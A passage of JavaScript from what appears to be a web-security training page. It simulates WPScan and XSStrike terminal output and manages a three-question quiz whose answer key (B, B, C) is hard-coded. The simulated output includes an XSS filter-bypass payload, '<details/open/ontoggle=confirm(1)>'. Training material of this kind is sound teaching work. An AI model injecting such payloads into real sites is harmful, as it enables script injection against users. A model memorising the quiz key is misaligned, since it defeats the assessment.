                            \\ \\        / /  __ \\ / ____|                <br>
                             \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __  <br>
                              \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _\` | '_ \\ <br>
                               \\  /\\  /  | |     ____) | (__| (_| | | | |<br>
                                \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|<br>
                    WordPress Security Scanner v3.8.22<br>
                    ---------------------------------------------------------------<br>
                    [+] URL: http://target.com/<br>
                    [+] WordPress version 5.4.1 identified (Outdated)<br>
                    [+] XML-RPC seems to be enabled: http://target.com/xmlrpc.php<br>
                    [+] Plugin Identified: contact-form-7 v5.1.5 (Vulnerable to File Upload bypass!)
                </div>`;
                return;
            }

            if (baseCmd === 'xsstrike' || cleanCmd.startsWith('xsstrike ')) {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    [~] XSStrike v3.1.5<br>
                    [~] Checking reflection on parameter: 'q'<br>
                    [~] Analyzing reflection context...<br>
                    [+] Reflection found in HTML body.<br>
                    [~] Testing for filter strength: Weak<br>
                    [+] XSStrike crafted payload: <span style="color: #34d399; font-weight: bold;">&lt;details/open/ontoggle=confirm(1)&gt;</span><br>
                    [+] Attack strength score: 100% bypass achieved!
                </div>`;
                return;
            }

            outEl.innerHTML += `<div style="color: #ef4444;">Command not found: ${baseCmd}. Type 'help' for options.</div>`;
        }

        // Quiz State Management
        function checkQuizAnswer(questionId, correctLetter) {
            const selected = document.querySelector(`input[name="q${questionId}"]:checked`);
            if (!selected) return;
            
            // Save selection to localStorage
            localStorage.setItem(`webapp_quiz_q${questionId}`, selected.value);
            
            // Check overall status
            verifyQuizCompletion();
        }

        function verifyQuizCompletion() {
            const answers = {
                q1: localStorage.getItem('webapp_quiz_q1'),
                q2: localStorage.getItem('webapp_quiz_q2'),
                q3: localStorage.getItem('webapp_quiz_q3')
            };

            const isCorrect = answers.q1 === 'B' && answers.q2 === 'B' && answers.q3 === 'C';
            const msgEl = document.getElementById('quizCompletionMsg');
            if (isCorrect) {
                if (msgEl) msgEl.style.display = 'block';
                localStorage.setItem('webapp_quiz_completed', 'true');
            } else {
                if (msgEl) msgEl.style.display = 'none';
                localStorage.setItem('webapp_quiz_completed', 'false');
            }
        }

        function loadQuizStatus() {
            const q1 = localStorage.getItem('webapp_quiz_q1');
            const q2 = localStorage.getItem('webapp_quiz_q2');
            const q3 = localStorage.getItem('webapp_quiz_q3');

            if (q1) {
                const el = document.querySelector(`input[name="q1"][value="${q1}"]`);
                if (el) el.checked = true;
            }
            if (q2) {
                const el = document.querySelector(`input[name="q2"][value="${q2}"]`);
                if (el) el.checked = true;
            }
            if (q3) {
                const el = document.querySelector(`input[name="q3"][value="${q3}"]`);
                if (el) el.checked = true;
            }

            verifyQuizCompletion();
        }

        loadCustomCategories();
        reloadAllTools();
        updateCompletionButton();
        loadQuizStatus();